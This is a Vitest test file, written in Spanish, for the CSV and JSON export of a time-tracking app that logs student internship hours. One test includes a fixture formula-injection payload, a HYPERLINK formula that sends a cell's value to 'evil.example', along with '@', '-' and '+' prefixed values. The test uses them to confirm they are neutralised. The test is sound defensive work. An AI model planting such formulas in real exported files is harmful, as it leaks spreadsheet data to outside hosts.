import { Timestamp } from 'firebase/firestore'
import { describe, expect, it } from 'vitest'
import { HOUR_MS, MINUTE_MS, formatHoursDecimal, progress } from '../lib/time'
import type { AppUser, Comment, Session } from '../types'
import { CSV_COLUMNS, buildCsv, buildJson, csvField, exportFilename } from './export'

const ms = (iso: string): number => Date.parse(iso)
const ts = (iso: string): Timestamp => Timestamp.fromMillis(ms(iso))

function mk(id: string, start: string, end: string | null, extra: Partial<Session> = {}): Session {
  return {
    id,
    owner: 'stu',
    method: 'live',
    start_time: ts(start),
    end_time: end === null ? null : ts(end),
    adjusted: false,
    adjust_reason: '',
    voided: false,
    void_reason: '',
    note: '',
    rev: 0,
    created_at: ts(start),
    updated_at: ts(start),
    ...extra,
  }
}

function comment(id: string, sessionId: string, at: string, text = 'Bien'): Comment {
  return { id, session_id: sessionId, session_owner: 'stu', author_uid: 'sup', text, created_at: ts(at) }
}

/** Parser CSV mínimo (RFC 4180 con ';') para comprobar el escape. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = []
  let row: string[] = []
  let field = ''
  let quoted = false
  for (let i = 0; i < text.length; i++) {
    const ch = text[i]
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') {
        field += '"'
        i++
      } else if (ch === '"') quoted = false
      else field += ch
    } else if (ch === '"') quoted = true
    else if (ch === ';') {
      row.push(field)
      field = ''
    } else if (ch === '\r' && text[i + 1] === '\n') {
      row.push(field)
      rows.push(row)
      row = []
      field = ''
      i++
    } else field += ch
  }
  if (field !== '' || row.length > 0) {
    row.push(field)
    rows.push(row)
  }
  return rows
}

const users: AppUser[] = [
  { uid: 'sup', role: 'supervisor', name: 'Profesora' },
  { uid: 'stu', role: 'student', name: 'Estudiante', target_hours: 298, program_start: ts('2026-07-01T07:00:00Z') },
]
const NOW = ms('2026-09-16T10:00:00Z')

const sessions: Session[] = [
  // Orden de entrada desordenado a propósito
  mk('m1', '2026-09-14T12:00:00Z', '2026-09-14T16:05:00Z', {
    method: 'manual',
    note: 'Informe; con "comillas"\ny salto de línea',
    rev: 1,
    created_at: ts('2026-09-15T08:00:00Z'),
  }),
  mk('l1', '2026-09-14T07:00:00Z', '2026-09-14T09:00:00Z', { note: '=HYPERLINK("x")', rev: 1 }),
  mk('adj', '2026-09-13T20:00:00Z', '2026-09-14T02:30:00Z', {
    adjusted: true,
    adjust_reason: 'Olvidé parar; salí a las 04:30',
    rev: 1,
  }),
  mk('void', '2026-09-15T07:00:00Z', '2026-09-15T12:00:00Z', { voided: true, void_reason: 'Duplicada por error', rev: 2 }),
  mk('open', '2026-09-16T07:00:00Z', null, { note: '  espacios  ' }),
]
const comments = [comment('c2', 'm1', '2026-09-15T10:00:00Z'), comment('c1', 'm1', '2026-09-15T09:00:00Z'), comment('c3', 'l1', '2026-09-15T09:30:00Z')]

describe('csvField', () => {
  it('escapa separador, comillas, saltos de línea y espacios en los extremos', () => {
    expect(csvField('simple')).toBe('simple')
    expect(csvField(12)).toBe('12')
    expect(csvField('a;b')).toBe('"a;b"')
    expect(csvField('di "hola"')).toBe('"di ""hola"""')
    expect(csvField('línea\nnueva')).toBe('"línea\nnueva"')
    expect(csvField('retorno\r')).toBe('"retorno\r"')
    expect(csvField(' borde ')).toBe('" borde "')
    expect(csvField('4,08')).toBe('4,08')
  })
})

describe('buildCsv', () => {
  const csv = buildCsv({ sessions, comments, users, nowMs: NOW })
  const rows = parseCsv(csv.slice(1))
  const byId = new Map(rows.slice(1, -1).map((r) => [r[r.length - 1], r]))
  const col = (name: (typeof CSV_COLUMNS)[number]) => CSV_COLUMNS.indexOf(name)

  it('empieza con BOM, usa CRLF y la cabecera en español', () => {
    expect(csv.startsWith('﻿')).toBe(true)
    expect(csv.endsWith('\r\n')).toBe(true)
    expect(csv.slice(1).split('\r\n')[0]).toBe(
      'Fecha;Inicio;Fin;Minutos;Horas;Método;Estado;Fin ajustado;Motivo del ajuste;Anulada;Motivo de la anulación;Nota;Comentarios;Registrada;Id',
    )
    // cabecera + 5 sesiones + total
    expect(rows).toHaveLength(7)
    for (const r of rows) expect(r).toHaveLength(CSV_COLUMNS.length)
  })

  it('filas en orden cronológico con horas de Madrid', () => {
    expect(rows.slice(1, -1).map((r) => r[col('Id')])).toEqual(['adj', 'l1', 'm1', 'void', 'open'])
    const l1 = byId.get('l1')!
    expect(l1.slice(0, 7)).toEqual(['14/09/2026', '09:00', '11:00', '120', '2,00', 'en vivo', 'cerrada'])
  })

  it('conserva notas con ; comillas y saltos de línea', () => {
    const m1 = byId.get('m1')!
    expect(m1[col('Nota')]).toBe('Informe; con "comillas"\ny salto de línea')
    expect(m1[col('Minutos')]).toBe('245')
    expect(m1[col('Horas')]).toBe('4,08')
    expect(m1[col('Método')]).toBe('manual')
    expect(m1[col('Comentarios')]).toBe('2')
    expect(m1[col('Registrada')]).toBe('15/09/2026 10:00')
    // El texto con espacios en los extremos va entre comillas
    expect(csv).toContain(';"  espacios  ";')
  })

  it('neutraliza fórmulas en texto libre', () => {
    expect(byId.get('l1')![col('Nota')]).toBe(`'=HYPERLINK("x")`)
    expect(byId.get('l1')![col('Comentarios')]).toBe('1')
  })

  it('neutraliza fórmulas también en el id y en un método desconocido (datos escritos desde fuera de la app)', () => {
    const hyperlink = '=HYPERLINK("https:"&CHAR(47)&CHAR(47)&"evil.example?h="&E3;"Ver detalle")'
    const odd = [
      mk('@SUM(1+1)', '2026-09-10T07:00:00Z', '2026-09-10T08:00:00Z'),
      mk(hyperlink, '2026-09-11T07:00:00Z', '2026-09-11T08:00:00Z'),
      mk('-1+2', '2026-09-12T07:00:00Z', '2026-09-12T08:00:00Z', { method: '+cmd' as unknown as 'live' }),
      mk('AbCdEfGhIjKlMnOpQr12', '2026-09-13T07:00:00Z', '2026-09-13T08:00:00Z'),
    ]
    const text = buildCsv({ sessions: odd, comments: [], users, nowMs: NOW })
    const r = parseCsv(text.slice(1))
    const ids = r.slice(1, -1).map((x) => x[col('Id')])
    expect(ids).toEqual(["'@SUM(1+1)", `'${hyperlink}`, "'-1+2", 'AbCdEfGhIjKlMnOpQr12'])
    expect(r[3][col('Método')]).toBe("'+cmd")
    // Ninguna celda empieza por un carácter que Excel evalúe
    for (const row of r) for (const cell of row) expect(cell).not.toMatch(/^[=+@]/)
    // Con comillas, el campo sigue empezando por el apóstrofo
    expect(text).toContain(`;"'=HYPERLINK(""https:""`)
  })

  it('sesión que cruza la medianoche: el fin lleva fecha; motivo del ajuste', () => {
    const adj = byId.get('adj')!
    expect(adj[col('Fecha')]).toBe('13/09/2026')
    expect(adj[col('Inicio')]).toBe('22:00')
    expect(adj[col('Fin')]).toBe('14/09/2026 04:30')
    expect(adj[col('Minutos')]).toBe('390')
    expect(adj[col('Horas')]).toBe('6,50')
    expect(adj[col('Fin ajustado')]).toBe('sí')
    expect(adj[col('Motivo del ajuste')]).toBe('Olvidé parar; salí a las 04:30')
    expect(adj[col('Anulada')]).toBe('no')
  })

  it('anuladas y en curso', () => {
    const v = byId.get('void')!
    expect(v[col('Estado')]).toBe('anulada')
    expect(v[col('Anulada')]).toBe('sí')
    expect(v[col('Motivo de la anulación')]).toBe('Duplicada por error')
    expect(v[col('Minutos')]).toBe('300')
    const o = byId.get('open')!
    expect(o[col('Estado')]).toBe('en curso')
    expect(o[col('Fin')]).toBe('')
    expect(o[col('Minutos')]).toBe('')
    expect(o[col('Horas')]).toBe('')
    expect(o[col('Comentarios')]).toBe('0')
  })

  it('la fila de total coincide con progress()', () => {
    const p = progress(sessions, 298, null, NOW)
    // 2 h + 4 h 05 + 6 h 30 (sin anulada ni abierta)
    expect(p.doneMs).toBe(12 * HOUR_MS + 35 * MINUTE_MS)
    const total = rows[rows.length - 1]
    expect(total[col('Fecha')]).toBe('TOTAL VÁLIDO')
    expect(total[col('Minutos')]).toBe(String(Math.floor(p.doneMs / MINUTE_MS)))
    expect(total[col('Horas')]).toBe(formatHoursDecimal(p.doneMs))
    expect(total[col('Horas')]).toBe('12,58')
    expect(total[col('Estado')]).toBe('3 sesiones válidas')
    expect(total[col('Fin ajustado')]).toBe('1 ajustada')
    expect(total[col('Nota')]).toBe('12 h 35 min de 298 h (4,2 %); exportado el 16/09/2026 12:00 (hora de Madrid)')
    expect(total[col('Comentarios')]).toBe('3')
  })

  it('el total usa milisegundos, no la suma de minutos redondeados', () => {
    // Tres sesiones de 20 min 40 s: 62 min completos en total, aunque cada fila diga 20
    const odd = [0, 1, 2].map((i) =>
      mk(`o${i}`, `2026-09-1${i}T07:00:00Z`, `2026-09-1${i}T07:20:40Z`),
    )
    const r = parseCsv(buildCsv({ sessions: odd, comments: [], users, nowMs: NOW }).slice(1))
    expect(r.slice(1, -1).map((x) => x[CSV_COLUMNS.indexOf('Minutos')])).toEqual(['20', '20', '20'])
    expect(r[r.length - 1][CSV_COLUMNS.indexOf('Minutos')]).toBe('62')
  })

  it('sin sesiones solo hay cabecera y total', () => {
    const r = parseCsv(buildCsv({ sessions: [], comments: [], users: [], nowMs: NOW }).slice(1))
    expect(r).toHaveLength(2)
    expect(r[1][CSV_COLUMNS.indexOf('Nota')]).toContain('0 h 00 min de 298 h (0,0 %)')
  })
})

describe('buildJson', () => {
  const json = JSON.parse(buildJson({ sessions, comments, users, nowMs: NOW }))

  it('incluye todo con fechas ISO 8601', () => {
    expect(json.exported_at).toBe('2026-09-16T10:00:00.000Z')
    expect(json.timezone).toBe('Europe/Madrid')
    expect(json.sessions.map((s: { id: string }) => s.id)).toEqual(['adj', 'l1', 'm1', 'void', 'open'])
    const m1 = json.sessions.find((s: { id: string }) => s.id === 'm1')
    expect(m1).toMatchObject({
      id: 'm1',
      owner: 'stu',
      method: 'manual',
      start_time: '2026-09-14T12:00:00.000Z',
      end_time: '2026-09-14T16:05:00.000Z',
      created_at: '2026-09-15T08:00:00.000Z',
      note: 'Informe; con "comillas"\ny salto de línea',
      status: 'cerrada',
      duration_ms: 4 * HOUR_MS + 5 * MINUTE_MS,
      rev: 1,
    })
    const open = json.sessions.find((s: { id: string }) => s.id === 'open')
    expect(open.end_time).toBeNull()
    expect(open.duration_ms).toBeNull()
    expect(open.status).toBe('en_curso')
    expect(json.comments.map((c: { id: string }) => c.id)).toEqual(['c1', 'c3', 'c2'])
    expect(json.comments[0].created_at).toBe('2026-09-15T09:00:00.000Z')
    const stu = json.users.find((u: { uid: string }) => u.uid === 'stu')
    expect(stu.program_start).toBe('2026-07-01T07:00:00.000Z')
    expect(stu.target_hours).toBe(298)
  })

  it('el resumen coincide con progress()', () => {
    const p = progress(sessions, 298, null, NOW)
    expect(json.summary.done_ms).toBe(p.doneMs)
    expect(json.summary.done_minutes).toBe(Math.floor(p.doneMs / MINUTE_MS))
    expect(json.summary.valid_sessions).toBe(3)
    expect(json.summary.adjusted_sessions).toBe(1)
    expect(json.summary.total_sessions).toBe(5)
    expect(json.summary.total_comments).toBe(3)
    expect(json.summary.target_hours).toBe(298)
  })

  it('no deja objetos Timestamp sin convertir', () => {
    expect(buildJson({ sessions, comments, users, nowMs: NOW })).not.toMatch(/"seconds"|"nanoseconds"/)
  })
})

describe('exportFilename', () => {
  it('usa la fecha de Madrid', () => {
    // 22:30Z del 15 = 00:30 del 16 en Madrid (en Nueva York aún es el 15)
    expect(exportFilename('csv', ms('2026-09-15T22:30:00Z'))).toBe('fichaje-2026-09-16.csv')
    expect(exportFilename('json', ms('2026-09-15T21:59:00Z'))).toBe('fichaje-2026-09-15.json')
  })
})
